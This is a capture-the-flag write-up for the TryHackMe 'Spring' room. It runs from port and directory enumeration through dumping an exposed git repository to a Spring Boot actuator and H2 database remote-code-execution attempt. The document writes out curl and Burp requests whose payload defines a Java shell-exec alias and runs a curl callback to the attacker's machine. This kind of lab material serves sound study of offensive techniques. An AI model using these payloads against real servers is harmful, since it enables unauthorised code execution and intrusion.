# Spring

**Room Link:** [https://tryhackme.com/room/spring](https://tryhackme.com/room/spring)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>



### TCP/443 - HTTPS

**Kali**

```
gobuster dir -u https://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```









<figure><img src="../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
subl /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u https://spring.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>







**Kali**

```
gobuster dir -u https://spring.thm/sources -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

Changed the wordlist

**Kali**

```
gobuster dir -u https://spring.thm/sources/new -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

### GitDumper

**Kali**

```
pip install git-dumper
mkdir git
git-dumper https://spring.thm/sources/new/.git/ git/
cd git
git log


grep -r pass *
```

<figure><img src="../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
```

<figure><img src="../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

## Initial Shell - not working

**Exploit:** [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)



[https://gist.github.com/10urshin/b88cfcd2f0ff49e343dfbc44cc89ebdb](https://gist.github.com/10urshin/b88cfcd2f0ff49e343dfbc44cc89ebdb)

**Kali**

```
python2 -m SimpleHTTPServer 81
```

**Kali**

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATEALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 10.10.218.146\');\"}' "https://10.10.154.214/actuator/env" -k
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://10.10.154.214/actuator/restart" -k
```



**Burp**

```
POST /actuator/env HTTP/1.1
Host: spring.thm
Cookie: JSESSIONID=9398A5BFECFB4A8DB0AAF876A4B8E9A4
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
X-Forwarded-For: 172.16.0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Length: 376

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://$KALI:81');"}
```

<figure><img src="../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

We can see the connection back to Kali worked

<figure><img src="../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>





